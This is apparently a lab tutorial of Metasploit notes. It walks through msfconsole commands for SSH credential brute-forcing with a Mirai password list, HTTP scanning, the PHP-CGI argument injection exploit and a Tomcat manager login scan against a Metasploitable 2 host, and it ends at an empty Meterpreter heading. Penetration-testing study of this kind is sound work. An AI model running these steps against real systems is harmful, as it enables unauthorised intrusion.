## Metasploit

_Exploit_ : An exploit is the mechanism used to attack a system in a particular way that it was never intended to do .
_Payload_ : A payload is code that is delivered and executed using a framework, on a target machine or device.
_Modules_ : Modules within Metasploit are software components that perform chosen attacks on specified targets.
_Listener_ : A listener within Metasploit waits for incoming connections from targets that have been exploited.
_Auxiliary_ : An auxiliary module in Metasploit is a helper tool used to perform actions like scanning, reconnaissance, and information gathering without executing a payload or popping a shell.

- To run Metasploit

```bash
$ service postgresql start
$ msfconsole
$ help
$ banner
$ search windows
$ use <Exploit Name>
$ show options
$ show targets
$ show info
$ show payload
$ set payload <Payload Name>
$ show options
$ ipconfig
$ set LHOST 192.168.1.7

```

## Metasploit Modules Explained

Directory Location

```bash
$ cd /usr/share/metasploit-framework
$ ls
# File Name msfvenom. It create our payload , metepreter shell and  backdoor
# You can update msfvenom
$ cd modules/
$ cd exploits/
$ cd windows/
$ cd /usr/share/metasploit-framework/modules/exploits/windows/smb
```

---

## 1. BruteForcing SSH with Metasploits

192.168.71.131

```bash
# IN Nmap Terminal
$ nmap -sV -p- <Target_Ip>

# IN Metasploit Terminal
$ msfconsole -q
$ search ssh scanner

# For better search Scanner
$ use auxiliary/scanner/ssh/ssh_version
$ show options
$ set RHOSTS <Target_Ip>
$ run

# To login the SSH Login
$ search ssh login
$ use auxiliary/scanner/ssh/ssh_login
$ show options
$ set RHOSTS <Target_IP>
$ set VERBOSE true

# Set up a Password List
$ cd /usr/share/wordlists/
$ set USERPASS_FILE /usr/share/wordlists/metasploit/mirai_user_pass.txt
$ run

```

_Done_

---

## 2. Exploit Port 80 HTTP Metasploitable 2

```bash

$ nmap -sV -p 80 192.168.71.131
# 80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)

$ search http_ver
# 0   auxiliary/scanner/http/http_version      .                normal  No     HTTP Version Detection

$ use auxiliary/scanner/http/http_version
$ show options
$ set RHOSTS 192.168.71.131
$ run
# 192.168.71.131:80 Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10 )

# Check Version on <Target_IP>/phpinfo

# Exploit
$ search dir_scanner
$ use auxiliary/scanner/http/dir_scanner
$ set RHOST 192.168.71.131
$ run

# Search for Configuration File (php.ini) Path : /etc/php5/cgi
$ search php_cgi
$ use exploit/multi/http/php_cgi_arg_injection
$ show options
$ set RHOST 192.168.71.131
$ exploit

```

---

## 3. Attacking Tomcat with Metasploit

```bash
# Find for Tomcat Services
$ nmap -sV -p- <Target_Ip>
$ search tomcat
$ use auxiliary/scanner/http/tomcat_mgr_login
$ show options

```

---

## 4. Getting Meterpreter with command Injection

